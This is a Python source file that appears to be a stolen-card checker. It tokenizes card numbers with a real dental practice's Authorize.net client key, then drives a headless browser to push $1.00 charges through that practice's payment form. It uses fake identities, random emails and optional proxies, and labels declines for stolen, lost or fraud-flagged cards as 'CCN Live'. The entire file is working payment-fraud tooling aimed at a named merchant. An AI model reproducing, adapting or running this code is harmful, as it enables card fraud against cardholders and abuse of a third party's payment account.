import httpx
import asyncio
import json
import random
import string
import time
import logging
import re

logger = logging.getLogger("authnet_azz")

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

AUTHNET_API_URL = "https://api.authorize.net/xml/v1/request.api"
API_LOGIN_ID = "8S7K8N7UGhqV"
CLIENT_KEY = "4L3nA5B2r7bw8nKgqX57VbXFqQS2W9G4y8zMJJRBX5TvANu5z5rJ2a3Y5422bsu6"
SITE_URL = "https://bethlehemdental.dentist/make-a-payment/"

ADDRESSES = [
    {'first': 'John', 'last': 'Smith', 'street': '1600 Pennsylvania Ave NW', 'city': 'Washington', 'state': 'District of Columbia', 'zip': '20500', 'phone': '2025551234'},
    {'first': 'James', 'last': 'Johnson', 'street': '350 Fifth Ave', 'city': 'New York', 'state': 'New York', 'zip': '10118', 'phone': '2125551234'},
    {'first': 'Robert', 'last': 'Williams', 'street': '233 S Wacker Dr', 'city': 'Chicago', 'state': 'Illinois', 'zip': '60606', 'phone': '3125551234'},
    {'first': 'Michael', 'last': 'Brown', 'street': '6060 Center Dr', 'city': 'Los Angeles', 'state': 'California', 'zip': '90045', 'phone': '3235551234'},
    {'first': 'William', 'last': 'Davis', 'street': '1000 Main St', 'city': 'Houston', 'state': 'Texas', 'zip': '77002', 'phone': '7135551234'},
]

_browser_instance = None
_browser_lock = asyncio.Lock()

JS_SUBMIT = """(d) => {
    const jq = jQuery;

    const setField = (name, val) => {
        const els = document.getElementsByName(name);
        if (!els.length) return;
        jq(els[0]).val(val).trigger('input').trigger('change');
    };

    setField('field_20', d.first);
    setField('field_21', d.last);
    setField('field_2', d.phone);
    setField('field_3', d.email);
    setField('field_8', d.street);
    setField('field_10', d.city);
    setField('field_12', d.zip);
    setField('field_19', '1.00');
    setField('field_22', '12345');

    const stateEls = document.getElementsByName('field_11[]');
    if (stateEls.length > 0) {
        for (let o of stateEls[0].options) {
            if (o.text.includes(d.state)) {
                jq(stateEls[0]).val(o.value).trigger('change');
                break;
            }
        }
    }

    const inst = window.wsf_form_instances[1];
    inst.form_ecommerce_calculate();

    jq('#wsf-1-field-18_descriptor').val(d.descriptor);
    jq('#wsf-1-field-18_value').val(d.value);

    window.authorize_amount_1 = 1.00;
    inst.form_ecommerce_set_payment_method('Authorize Accept');
    inst.form_ecommerce_set_payment_amount(1.00);

    inst.form_valid = true;
    inst.form_obj.submit();
}"""


def _random_email():
    name = ''.join(random.choices(string.ascii_lowercase, k=8))
    num = ''.join(random.choices(string.digits, k=3))
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'hotmail.com']
    return f"{name}{num}@{random.choice(domains)}"


def _classify_authnet_error(error_str):
    parts = error_str.split(":", 1)
    code_str = parts[0].strip() if parts else ""
    message = parts[1].strip() if len(parts) > 1 else error_str

    lower = message.lower()

    if "this transaction has been approved" in lower or lower.strip() == "approved":
        return "Approved", f"Charged - {message}"

    if "held for review" in lower:
        return "Approved", f"CCN Live - {message}"

    if "duplicate transaction" in lower:
        return "Approved", f"CCN Live - {message}"

    live_keywords = [
        "insufficient fund", "do not honor", "do_not_honor",
        "pick up card", "pickup card", "stolen card", "lost card",
        "restricted card", "hold - Loss Prevention",
        "call issuer", "call auth center", "referral",
        "exceeds withdrawal", "exceeds limit",
        "security violation", "card acceptor",
        "incorrect cvv", "cvv2 mismatch", "cvc mismatch",
        "incorrect cvc", "card code", "cvv does not match",
        "avs mismatch", "no match", "incorrect address",
        "incorrect zip", "zip code does not match",
        "not permitted", "velocity",
        "fraud", "suspected fraud",
    ]
    for kw in live_keywords:
        if kw in lower:
            return "Approved", f"CCN Live - {message}"

    live_reason_codes = {
        "27", "28", "29", "41", "43", "44", "45",
        "51", "54", "57", "65", "78", "127",
        "165", "250", "251", "254", "261", "315",
    }
    if code_str in live_reason_codes:
        return "Approved", f"CCN Live - {message}"

    if "expired" in lower or "credit card has expired" in lower:
        return "Declined", f"Card Expired - {message}"

    if "invalid card" in lower or "invalid account" in lower:
        return "Declined", f"Invalid Card - {message}"

    if "this transaction has been declined" in lower:
        return "Declined", message

    declined_keywords = [
        "declined", "invalid", "not found", "unable to process",
        "rejected", "not accepted", "card not supported",
    ]
    for kw in declined_keywords:
        if kw in lower:
            return "Declined", message

    if "error" in lower:
        return "Declined", message

    return "Declined", message


async def _tokenize_card(cc, mm, yy, cvv, proxy=None):
    exp_year = f"20{yy}" if len(yy) == 2 else yy
    exp_date = f"{mm}{exp_year}"

    payload = {
        "securePaymentContainerRequest": {
            "merchantAuthentication": {
                "name": API_LOGIN_ID,
                "clientKey": CLIENT_KEY
            },
            "data": {
                "type": "TOKEN",
                "id": ''.join(random.choices(string.ascii_lowercase + string.digits, k=20)),
                "token": {
                    "cardNumber": cc,
                    "expirationDate": exp_date,
                    "cardCode": cvv
                }
            }
        }
    }

    client_kwargs = {"timeout": httpx.Timeout(15), "headers": {"User-Agent": UA}}
    if proxy:
        client_kwargs["proxy"] = proxy

    async with httpx.AsyncClient(**client_kwargs) as client:
        resp = await client.post(AUTHNET_API_URL, json=payload, headers={
            "Content-Type": "application/json", "Accept": "application/json"
        })
        text = resp.text.lstrip('\ufeff')
        data = json.loads(text)

    messages = data.get("messages", {})
    if messages.get("resultCode") == "Error":
        msg_list = messages.get("message", [])
        if msg_list:
            code = msg_list[0].get("code", "")
            msg_text = msg_list[0].get("text", "")
            if code == "E_WC_05":
                return None, "Declined - Invalid card number"
            elif code in ("E_WC_06", "E_WC_08"):
                return None, "Declined - Card expired"
            elif code == "E_WC_15":
                return None, "Error - Invalid merchant credentials"
            elif code == "E_WC_19":
                return None, "Error - Merchant account disabled"
            return None, f"Error - {code}: {msg_text}"

    opaque = data.get("opaqueData", {})
    if not opaque.get("dataValue"):
        return None, "Error - No token received"

    return opaque, None


async def _submit_payment(opaque_data):
    from playwright.async_api import async_playwright

    addr = random.choice(ADDRESSES)
    email = _random_email()
    captured = []

    async with async_playwright() as p:
        browser = await p.chromium.launch(headless=True, args=[
            '--no-sandbox', '--disable-setuid-sandbox',
            '--disable-dev-shm-usage', '--disable-gpu',
        ])
        try:
            context = await browser.new_context(user_agent=UA)
            page = await context.new_page()

            async def on_resp(response):
                if 'ws-form' in response.url and 'submit' in response.url:
                    try:
                        body = await response.text()
                    except:
                        body = ''
                    captured.append({'status': response.status, 'body': body})

            page.on('response', on_resp)
            await page.goto(SITE_URL, wait_until='networkidle', timeout=30000)

            token_data = {
                'descriptor': opaque_data['dataDescriptor'],
                'value': opaque_data['dataValue'],
                'first': addr['first'],
                'last': addr['last'],
                'phone': addr['phone'],
                'email': email,
                'street': addr['street'],
                'city': addr['city'],
                'state': addr['state'],
                'zip': addr['zip'],
            }

            await page.evaluate(JS_SUBMIT, token_data)

            for _ in range(25):
                if captured:
                    break
                await asyncio.sleep(0.5)

            if not captured:
                await asyncio.sleep(2)

        finally:
            await browser.close()

    return captured


async def authnet_azz_check(cc, mm, yy, cvv, proxy=None):
    start = time.time()

    try:
        opaque, token_err = await _tokenize_card(cc, mm, yy, cvv, proxy)
        if token_err:
            elapsed = round(time.time() - start, 2)
            return f"{token_err} [{elapsed}s]"

        captured = await asyncio.wait_for(
            _submit_payment(opaque),
            timeout=45
        )

        elapsed = round(time.time() - start, 2)

        if not captured:
            return f"Error - No response from gateway [{elapsed}s]"

        resp = captured[0]
        body = resp.get('body', '')

        if not body:
            return f"Error - Empty response (HTTP {resp.get('status', '?')}) [{elapsed}s]"

        try:
            data = json.loads(body)
        except:
            return f"Error - Invalid response [{elapsed}s]"

        errors = data.get('data', {}).get('errors', [])
        if errors:
            error_msg = errors[0] if errors else "Unknown error"
            status, message = _classify_authnet_error(str(error_msg))
            return f"{status} - {message} [{elapsed}s]"

        error_flag = data.get('error', False)
        if error_flag:
            return f"Error - Form validation failed [{elapsed}s]"

        return f"Approved - Transaction Approved [{elapsed}s]"

    except asyncio.TimeoutError:
        elapsed = round(time.time() - start, 2)
        return f"Error - Gateway timeout [{elapsed}s]"
    except Exception as e:
        elapsed = round(time.time() - start, 2)
        err_msg = str(e)[:100]
        return f"Error - {err_msg} [{elapsed}s]"
